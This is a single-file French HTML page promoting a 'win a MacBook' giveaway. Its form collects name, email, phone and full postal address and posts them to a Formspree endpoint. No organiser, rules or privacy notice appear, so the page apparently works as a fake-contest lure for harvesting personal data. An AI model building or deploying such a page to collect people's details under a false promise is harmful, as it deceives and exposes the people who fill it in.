<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Gagnez un MacBook</title>

<style>
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, sans-serif;
  background: linear-gradient(135deg, #0f172a, #1e293b);
  color: white;
  text-align: center;
}

.container {
  padding: 40px 20px;
}

.card {
  max-width: 450px;
  margin: auto;
  background: rgba(255,255,255,0.05);
  backdrop-filter: blur(20px);
  border-radius: 20px;
  padding: 30px;
  box-shadow: 0 20px 50px rgba(0,0,0,0.5);
}

img {
  width: 100%;
  border-radius: 20px;
  margin-bottom: 20px;
  object-fit: cover;
}

h1 {
  font-size: 32px;
}

h2 {
  margin-top: 10px;
}

p {
  color: #cbd5e1;
}

.btn {
  background: linear-gradient(135deg, #6366f1, #a855f7);
  border: none;
  padding: 14px;
  border-radius: 25px;
  color: white;
  font-weight: bold;
  cursor: pointer;
  width: 100%;
  margin-top: 20px;
  transition: 0.2s;
}

.btn:hover {
  transform: scale(1.05);
}

input {
  width: 100%;
  padding: 12px;
  margin: 10px 0;
  border-radius: 10px;
  border: none;
  outline: none;
}

.hidden {
  display: none;
}

/* RADIO ALIGNÉ */
.radio-group {
  display: flex;
  gap: 20px;
  margin-bottom: 15px;
}

.radio-group label {
  display: flex;
  align-items: center;
  gap: 8px;
  font-size: 14px;
}

.radio-group input {
  transform: scale(1.2);
  cursor: pointer;
}

.success {
  font-size: 60px;
  margin-bottom: 10px;
}
</style>

</head>

<body>

<div class="container">

<!-- PAGE 1 -->
<div id="step1" class="card">
  <img src="https://images.unsplash.com/photo-1517336714731-489689fd1ca8?auto=format&fit=crop&w=1000&q=80">
  <h1>Gagnez le nouveau MacBook</h1>
  <p>Participez gratuitement pour tenter de remporter ce modèle dernière génération.</p>
  <button class="btn" onclick="showForm()">Participer</button>
</div>

<!-- PAGE 2 -->
<div id="step2" class="card hidden">
  <img src="https://images.unsplash.com/photo-1496181133206-80ce9b88a853?auto=format&fit=crop&w=1000&q=80">
  <h2>Inscription</h2>

  <form id="contestForm">

    <!-- CIVILITÉ -->
    <div class="radio-group">
      <label><input type="radio" name="civilite" value="Mr" required> Mr</label>
      <label><input type="radio" name="civilite" value="Mme"> Mme</label>
    </div>

    <input type="text" id="nom" placeholder="Nom" required>
    <input type="text" id="prenom" placeholder="Prénom" required>
    <input type="text" id="email" placeholder="Email" required>
    <input type="text" id="telephone" placeholder="Téléphone" required>

    <input type="text" id="adresse" placeholder="Adresse postale complète" required>

    <button class="btn" type="submit">Valider</button>
  </form>
</div>

<!-- PAGE 3 -->
<div id="step3" class="card hidden">
  <img src="https://images.unsplash.com/photo-1605902711622-cfb43c4437d1?auto=format&fit=crop&w=1000&q=80">
  <div class="success">🎉</div>
  <h2>Bravo !</h2>
  <p>Votre participation a bien été enregistrée.</p>
  <p>Les résultats vous seront communiqués prochainement.</p>
</div>

</div>

<script>
function showForm() {
  document.getElementById("step1").classList.add("hidden");
  document.getElementById("step2").classList.remove("hidden");
}

document.getElementById("contestForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const civilite = document.querySelector('input[name="civilite"]:checked')?.value;
  const nom = document.getElementById("nom").value;
  const prenom = document.getElementById("prenom").value;
  const email = document.getElementById("email").value.toLowerCase();
  const telephone = document.getElementById("telephone").value;
  const adresse = document.getElementById("adresse").value;

  if (!civilite || !nom || !prenom || !email || !telephone || !adresse) {
    alert("Veuillez remplir tous les champs");
    return;
  }

  fetch("https://formspree.io/f/xnjozjby", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      civilite,
      nom,
      prenom,
      email,
      telephone,
      adresse
    })
  });

  document.getElementById("step2").classList.add("hidden");
  document.getElementById("step3").classList.remove("hidden");
});
</script>

</body>
</html>
